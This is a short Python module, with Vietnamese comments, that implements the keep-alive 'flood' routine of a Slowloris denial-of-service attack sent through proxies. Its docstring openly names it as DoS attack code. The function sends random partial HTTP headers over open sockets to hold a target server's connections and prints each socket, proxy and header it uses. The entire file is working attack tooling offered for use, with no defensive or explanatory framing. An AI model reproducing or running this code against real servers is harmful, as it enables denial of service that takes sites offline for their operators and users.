"""This module provides the flood function for a Slowloris DoS attack through proxies."""

import random
import socket
from typing import Dict
from colorama import Fore as F

def flood(sock: socket.SocketType, proxy: Dict[str, str]) -> None:
    """Keep the sockets alive in Slowloris flood through proxies.

    Args:
        sock (socket.SocketType): The socket to be kept alive
        proxy (Dict[str, str]): The proxy to be used

    Returns:
        None
    """
    try:
        # Lấy địa chỉ IP và cổng của socket
        laddr, port = sock.getsockname()
        
        # Tạo một header ngẫu nhiên và gửi qua socket
        random_header = random.randint(1, 5000)
        sock.send(f"X-a: {random_header}\r\n".encode("utf-8"))
        
        # Tạo chuỗi thông báo proxy và header đã gửi
        proxy_addr = f"{F.RESET}|{F.RESET} Proxy: {F.BLUE}{proxy['addr']}:{proxy['port']:>5} "
        header_sent = f"{F.RESET} Header Sent:{F.BLUE} X-a {random_header:>4}"
        
        print(f"{F.RESET} --> Socket: {F.BLUE}{laddr}:{port} {proxy_addr}{F.RESET}|{header_sent} {F.RESET}")
        
    except (BrokenPipeError, socket.error) as e:
        print(f"{F.RED}[!] Socket error: {e}{F.RESET}")
        try:
            # Đóng socket nếu có lỗi xảy ra
            sock.close()
        except Exception as close_err:
            print(f"{F.RED}[!] Error closing socket: {close_err}{F.RESET}")
